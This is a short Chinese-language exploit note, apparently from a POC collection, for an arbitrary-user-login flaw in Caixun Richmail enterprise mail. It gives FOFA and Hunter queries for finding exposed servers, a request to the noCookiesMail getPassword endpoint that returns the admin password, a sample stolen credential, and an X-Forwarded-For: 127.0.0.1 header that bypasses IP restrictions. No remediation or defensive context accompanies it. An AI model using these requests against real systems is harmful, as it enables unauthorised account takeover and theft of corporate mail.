# 彩讯 Richmail 任意用户登录漏洞

## 网络测绘

fofa: app="Richmail-企业邮箱"

hunter: web.title="Richmail 企业邮箱" || web.body="Richmail 企业邮箱" || web.body="richmail.config.js"

## POC / EXP

```
/RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin

{'code':'S_OK','var':{"result":0,"errorMsg":"64e561f1c9dd993cef96"}}

admin/64e561f1c9dd993cef96
```

```
IP 受限
X-Forwarded-For: 127.0.0.1
```

```
/RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin@+证书 or 根域名
```